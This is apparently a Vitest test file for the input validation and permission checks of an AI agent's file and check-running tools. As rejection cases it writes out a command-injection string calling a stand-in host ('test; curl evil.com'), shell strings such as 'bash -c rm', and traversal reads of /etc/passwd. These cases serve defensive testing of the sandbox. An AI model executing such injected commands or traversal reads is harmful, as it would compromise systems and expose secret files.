import { describe, it, expect } from 'vitest'
import {
  ListFilesInputSchema,
  ReadFileInputSchema,
  WriteFileInputSchema,
  RunCheckInputSchema,
  FinalizeInputSchema,
  validateToolInput,
  isKnownPilotToolName,
  isReadPathAuthorized,
  isWritePathAuthorized,
  isCheckAuthorized,
  PILOT_TOOL_NAMES,
} from '../src/contracts/project-tool-contracts.js'
import {
  SPRINT4A_TOOL_LIST_FILES,
  SPRINT4A_TOOL_READ_FILE,
  SPRINT4A_TOOL_WRITE_FILE,
  SPRINT4A_TOOL_RUN_CHECK,
  SPRINT4A_TOOL_FINALIZE,
} from '../src/config/constants.js'

describe('project-tool-contracts', () => {
  describe('tool name guard', () => {
    it('recognises all five pilot tool names', () => {
      for (const name of PILOT_TOOL_NAMES) {
        expect(isKnownPilotToolName(name)).toBe(true)
      }
    })

    it('rejects unknown tool names', () => {
      expect(isKnownPilotToolName('bash')).toBe(false)
      expect(isKnownPilotToolName('executor_probe')).toBe(false)
      expect(isKnownPilotToolName('')).toBe(false)
    })
  })

  describe('ListFilesInputSchema', () => {
    it('accepts empty object', () => {
      expect(ListFilesInputSchema.safeParse({}).success).toBe(true)
    })

    it('rejects additional properties', () => {
      expect(ListFilesInputSchema.safeParse({ path: '/' }).success).toBe(false)
    })
  })

  describe('ReadFileInputSchema — shape validation only', () => {
    // Schema validates path shape. Authorization (whether the path is in
    // allowedReadPaths) is the broker's responsibility, not the schema's.

    it('accepts a generic engine path', () => {
      expect(ReadFileInputSchema.safeParse({ path: 'src/engine/sim.ts' }).success).toBe(true)
    })

    it('accepts the pilot status.js path', () => {
      // Schema does not restrict to pilot paths — any safe relative path passes
      expect(ReadFileInputSchema.safeParse({ path: 'src/status.js' }).success).toBe(true)
    })

    it('accepts package.json', () => {
      expect(ReadFileInputSchema.safeParse({ path: 'package.json' }).success).toBe(true)
    })

    it('rejects traversal path', () => {
      expect(ReadFileInputSchema.safeParse({ path: '../../etc/passwd' }).success).toBe(false)
    })

    it('rejects absolute path', () => {
      expect(ReadFileInputSchema.safeParse({ path: '/etc/passwd' }).success).toBe(false)
    })

    it('rejects missing path field', () => {
      expect(ReadFileInputSchema.safeParse({}).success).toBe(false)
    })

    it('rejects path exceeding 500 chars', () => {
      expect(ReadFileInputSchema.safeParse({ path: 'x'.repeat(501) }).success).toBe(false)
    })

    // Note: .env, private/secret.txt, etc. are accepted by the schema
    // because they are valid filenames. The broker's isReadPathAuthorized
    // rejects them by checking against contract allowedReadPaths.
    it('schema accepts .env (broker-level authorization rejects it)', () => {
      expect(ReadFileInputSchema.safeParse({ path: '.env' }).success).toBe(true)
    })
  })

  describe('WriteFileInputSchema — shape validation only', () => {
    it('accepts a valid engine test path with content', () => {
      const result = WriteFileInputSchema.safeParse({
        path: 'src/engine/tests/foo.test.ts',
        content: 'import assert from "node:assert"',
      })
      expect(result.success).toBe(true)
    })

    it('accepts the pilot status.js path', () => {
      const result = WriteFileInputSchema.safeParse({
        path: 'src/status.js',
        content: 'export function ok() {}',
      })
      expect(result.success).toBe(true)
    })

    it('rejects traversal path', () => {
      expect(
        WriteFileInputSchema.safeParse({ path: '../../etc/passwd', content: 'x' }).success,
      ).toBe(false)
    })

    it('rejects absolute path', () => {
      expect(
        WriteFileInputSchema.safeParse({ path: '/etc/passwd', content: 'x' }).success,
      ).toBe(false)
    })

    it('rejects content exceeding max length', () => {
      const result = WriteFileInputSchema.safeParse({
        path: 'src/engine/tests/foo.test.ts',
        content: 'x'.repeat(20001),
      })
      expect(result.success).toBe(false)
    })

    it('accepts content exactly at max length', () => {
      const result = WriteFileInputSchema.safeParse({
        path: 'src/engine/tests/foo.test.ts',
        content: 'x'.repeat(20000),
      })
      expect(result.success).toBe(true)
    })

    it('rejects missing content', () => {
      expect(WriteFileInputSchema.safeParse({ path: 'src/status.js' }).success).toBe(false)
    })

    // Note: .env, package.json are accepted by the schema (valid filenames).
    // Broker's isWritePathAuthorized rejects them — they are not in allowedWritePaths.
    it('schema accepts .env shape (broker-level authorization rejects it)', () => {
      expect(
        WriteFileInputSchema.safeParse({ path: '.env', content: 'KEY=val' }).success,
      ).toBe(true)
    })

    it('schema accepts package.json shape (broker-level authorization rejects it)', () => {
      expect(
        WriteFileInputSchema.safeParse({ path: 'package.json', content: '{}' }).success,
      ).toBe(true)
    })
  })

  describe('RunCheckInputSchema — shape validation only', () => {
    it('accepts "test"', () => {
      expect(RunCheckInputSchema.safeParse({ check: 'test' }).success).toBe(true)
    })

    it('accepts "typecheck" (non-pilot check name)', () => {
      expect(RunCheckInputSchema.safeParse({ check: 'typecheck' }).success).toBe(true)
    })

    it('accepts "lint"', () => {
      expect(RunCheckInputSchema.safeParse({ check: 'lint' }).success).toBe(true)
    })

    it('rejects string with spaces (shell command shape)', () => {
      expect(
        RunCheckInputSchema.safeParse({ check: 'bash -c rm' }).success,
      ).toBe(false)
    })

    it('rejects shell injection with semicolons', () => {
      expect(
        RunCheckInputSchema.safeParse({ check: 'test; curl evil.com' }).success,
      ).toBe(false)
    })

    it('rejects "node --test" as a direct command (spaces)', () => {
      expect(
        RunCheckInputSchema.safeParse({ check: 'node --test' }).success,
      ).toBe(false)
    })

    it('rejects missing check field', () => {
      expect(RunCheckInputSchema.safeParse({}).success).toBe(false)
    })

    it('rejects check ID starting with a digit', () => {
      expect(RunCheckInputSchema.safeParse({ check: '1test' }).success).toBe(false)
    })
  })

  describe('FinalizeInputSchema', () => {
    it('accepts valid summary', () => {
      expect(
        FinalizeInputSchema.safeParse({ summary: 'Implemented summarizeChecks' }).success,
      ).toBe(true)
    })

    it('rejects empty summary', () => {
      expect(FinalizeInputSchema.safeParse({ summary: '' }).success).toBe(false)
    })

    it('rejects summary exceeding 2000 chars', () => {
      expect(
        FinalizeInputSchema.safeParse({ summary: 'x'.repeat(2001) }).success,
      ).toBe(false)
    })
  })

  describe('validateToolInput dispatch', () => {
    it('dispatches project_list_files', () => {
      expect(() =>
        validateToolInput(SPRINT4A_TOOL_LIST_FILES, {}),
      ).not.toThrow()
    })

    it('dispatches project_read_file and rejects traversal path', () => {
      expect(() =>
        validateToolInput(SPRINT4A_TOOL_READ_FILE, { path: '../../etc/passwd' }),
      ).toThrow(/rejected/)
    })

    it('dispatches project_read_file and accepts a valid path', () => {
      expect(() =>
        validateToolInput(SPRINT4A_TOOL_READ_FILE, { path: 'src/engine/sim.ts' }),
      ).not.toThrow()
    })

    it('dispatches project_write_file and rejects traversal path', () => {
      expect(() =>
        validateToolInput(SPRINT4A_TOOL_WRITE_FILE, { path: '../../etc/passwd', content: 'x' }),
      ).toThrow(/rejected/)
    })

    it('dispatches project_run_check and rejects shell command', () => {
      expect(() =>
        validateToolInput(SPRINT4A_TOOL_RUN_CHECK, { check: 'bash -c evil' }),
      ).toThrow(/rejected/)
    })

    it('dispatches project_run_check and accepts valid check ID', () => {
      expect(() =>
        validateToolInput(SPRINT4A_TOOL_RUN_CHECK, { check: 'typecheck' }),
      ).not.toThrow()
    })

    it('dispatches project_finalize and rejects empty summary', () => {
      expect(() =>
        validateToolInput(SPRINT4A_TOOL_FINALIZE, { summary: '' }),
      ).toThrow(/rejected/)
    })
  })

  describe('broker authorization — isReadPathAuthorized', () => {
    it('authorizes exact path match', () => {
      expect(isReadPathAuthorized('package.json', ['package.json', 'src/**'])).toBe(true)
    })

    it('authorizes via glob pattern', () => {
      expect(isReadPathAuthorized('src/engine/sim.ts', ['src/**'])).toBe(true)
    })

    it('denies path not matching any pattern', () => {
      expect(isReadPathAuthorized('.env', ['src/**', 'package.json'])).toBe(false)
    })

    it('denies steam path when not in allowedReadPaths', () => {
      expect(isReadPathAuthorized('src/steam/index.ts', ['src/engine/**', 'package.json'])).toBe(false)
    })
  })

  describe('broker authorization — isWritePathAuthorized', () => {
    it('authorizes test file via glob', () => {
      expect(isWritePathAuthorized('src/engine/tests/foo.test.ts', ['src/engine/tests/**'])).toBe(true)
    })

    it('denies shipping source outside writable scope', () => {
      expect(isWritePathAuthorized('src/engine/sim.ts', ['src/engine/tests/**'])).toBe(false)
    })

    it('denies package.json', () => {
      expect(isWritePathAuthorized('package.json', ['src/engine/tests/**'])).toBe(false)
    })
  })

  describe('broker authorization — isCheckAuthorized', () => {
    const checks = { test: { command: 'node --test', required: true }, typecheck: { command: 'tsc --noEmit', required: true } }

    it('authorizes declared check', () => {
      expect(isCheckAuthorized('test', checks)).toBe(true)
      expect(isCheckAuthorized('typecheck', checks)).toBe(true)
    })

    it('denies undeclared check', () => {
      expect(isCheckAuthorized('bash', checks)).toBe(false)
      expect(isCheckAuthorized('lint', checks)).toBe(false)
      expect(isCheckAuthorized('', checks)).toBe(false)
    })
  })
})
